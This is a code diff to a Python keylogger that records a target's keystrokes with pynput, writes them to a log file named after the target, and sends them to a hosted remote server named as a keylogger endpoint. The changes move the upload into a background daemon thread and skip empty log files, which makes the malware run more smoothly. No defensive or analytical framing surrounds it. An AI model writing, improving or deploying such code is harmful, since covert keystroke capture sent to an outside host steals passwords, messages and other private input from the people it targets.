@@ -1,13 +1,14 @@
 import os
 import time
 import requests
+import threading
 from pynput.keyboard import Key, Listener
 
 # Configuration
 TARGET_DIR = "Logs"  # Directory to store logs
 USER_NAME = "Target_1"  # Target name
 LOG_FILE = os.path.join(TARGET_DIR, f"{USER_NAME}.txt")
-API_URL = "https://keylogger-production-3a51.up.railway.app/logs"  # FastAPI server URL
+API_URL = "https://keylogger-production-3a51.up.railway.app/logs"  # FastAPI server URL (Railway Deployment)
 MAX_SIZE = 10 * 1024 * 1024  # 10MB file size limit
 
 # Ensure the Logs directory exists
@@ -27,7 +28,7 @@ def send_logs():
     while True:
         try:
             # Check if the log file exists and isn't empty
-            if os.path.exists(LOG_FILE):
+            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                 with open(LOG_FILE, "r") as f:
                     logs = f.read()
 
@@ -56,6 +57,11 @@ def on_release(key):
         return False  # Stop the keylogger
 
 # Start the keylogger and log-sending process
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    send_logs_thread = send_logs()  # Run log sending in the background
-    listener.join()
+if __name__ == "__main__":
+    # Create a background thread to send logs
+    log_thread = threading.Thread(target=send_logs, daemon=True)
+    log_thread.start()
+
+    # Start listening for key events
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()  # Block until the listener stops
